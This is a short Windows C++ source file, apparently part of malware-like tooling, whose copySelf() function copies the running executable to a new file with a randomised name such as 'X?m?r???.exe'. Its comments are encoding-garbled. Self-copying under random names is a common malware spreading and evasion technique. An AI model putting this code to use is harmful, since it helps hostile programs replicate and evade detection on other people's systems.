#include "stdafx.h"
#include "ToolKit.h"
#include "libsysaux.h"

#define DIST_DIR "./"

//����������������·��

//���������ĸ
int CToolKit::SEU_RandEx(int min, int max)
{
	if (min == max)
		return min;

	srand(GetTickCount()); //����Ҫ��һ��
	int seed = rand() + 3;

	return seed % (max - min + 1) + min;
}

BOOL CToolKit::copySelf()
{
	TCHAR currentFullPath[MAX_PATH];
	TCHAR moduleName[MAX_PATH];
	TCHAR tempPath[MAX_PATH];

/////////////

	GetTempPath(MAX_PATH, tempPath);
	//GetSystemDirectory(tempPath, MAX_PATH);
	wprintf(tempPath);

	GetCurrentDirectory(MAX_PATH, currentFullPath);	//�ȷ��ڵ�ǰĿ¼��
	wsprintf(currentFullPath, L"%s\\X%cm%cr%c%c%c.exe", currentFullPath, SEU_RandEx('A','Z'),
					SEU_RandEx('b','y'), SEU_RandEx('c','x'), SEU_RandEx('D','W'), SEU_RandEx('e','v'));
	//�������Ŷ���az ����ķ��ֻᱻ�������Ż���һ����
	

	GetModuleFileName(NULL, moduleName, MAX_PATH);	//ȡ�õ�ǰ�ļ���ȫ·��
	wsprintf(moduleName, L"%s", moduleName);

	wprintf(currentFullPath);
	wprintf(moduleName);
	
	 
	 if (!CopyFile(moduleName, currentFullPath, FALSE))
	 {
		 printf("[-] Copy file failed! \n");
		 return FALSE;
	 }
	return TRUE;
}